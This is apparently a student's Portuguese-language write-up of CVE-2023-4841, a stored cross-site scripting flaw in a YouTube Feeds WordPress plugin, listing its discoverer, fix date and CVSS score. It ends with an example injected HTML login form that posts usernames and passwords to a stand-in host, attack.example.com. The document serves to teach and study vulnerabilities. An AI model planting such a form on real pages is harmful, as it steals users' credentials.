
# Trabalho realizado nas Semanas #2 e #3

## Identificação:

- CVE-2023-4841
- Store Cross-Site Scripting. 
- Os sistemas afetados pela vulnerabilidade são o Feeds do Youtube para plugins de Wordpress através do shortcode em versões até, e incluíndo, 2.1.

## Catalogação

- Descoberto por Lana Codes
- Resolvido por Craig at Smash Balloon em 12/09/2023
- Este CVE foi publicado por Wordfence 
- CVSS de 6.4 

## Exploit

- Cross-site scripting que ocorre quando não é feita a devida neutralização do user input
- Permite executar código e aceder a recursos de um domínio diferente
- Roubo de informação pessoal como por exemplo passwords


## Ataques

- Não foi registado nenhum ataque que toma-se proveito desta vulnerabilidade
- Se o utilizador aceder a um link com o script Welcome.php é gerado o seguinte HTML que é enviado para o browser do utilizador:
 
```html
<div class="header"> Welcome, <div id="stealPassword"> Please Login:

<form name="input" action="attack.example.com/stealPassword.php" method="post">
Username: <input type="text" name="username" /><br/>
Password: <input type="password" name="password" /><br/>
<input type="submit" value="Login" />
</form>

</div></div>
``` 



